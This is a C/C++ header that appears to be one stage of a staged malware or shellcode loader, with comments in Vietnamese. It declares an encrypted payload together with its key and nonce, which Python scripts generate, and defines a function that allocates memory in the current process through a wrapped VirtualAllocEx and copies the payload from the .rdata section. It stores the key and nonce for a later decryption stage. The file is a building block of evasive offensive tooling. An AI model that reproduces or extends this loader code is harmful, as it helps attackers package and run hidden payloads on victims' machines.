#pragma once
#include "../../core/utils.h"
#include "../../api/api_wrappers.h"
#include "../context.h"
#include "payload_data.h"

// Các biến toàn cục do Python tạo ra
extern unsigned char PAYLOAD[];
extern unsigned int  PAYLOAD_LEN;
extern unsigned char PAYLOAD_KEY[];
extern unsigned int  PAYLOAD_KEY_LEN;
extern unsigned char PAYLOAD_NONCE[];
extern unsigned int  PAYLOAD_NONCE_LEN;

inline BOOL Stage1_Storage_Rdata(TechniqueContext* ctx)
{
    if (!ctx) return FALSE;

    ctx->length = PAYLOAD_LEN;

    ctx->data = (unsigned char*)MyVirtualAllocEx(
        (HANDLE)-1,
        NULL,
        ctx->length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!ctx->data)
        return FALSE;

    memcpy(ctx->data, PAYLOAD, ctx->length);

    ctx->key     = PAYLOAD_KEY;
    ctx->key_len = PAYLOAD_KEY_LEN;

    ctx->nonce     = PAYLOAD_NONCE;
    ctx->nonce_len = PAYLOAD_NONCE_LEN;

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage1",
              "Payload copied from rdata to heap (%llu bytes)",
              ctx->length);
#endif

    return TRUE;
}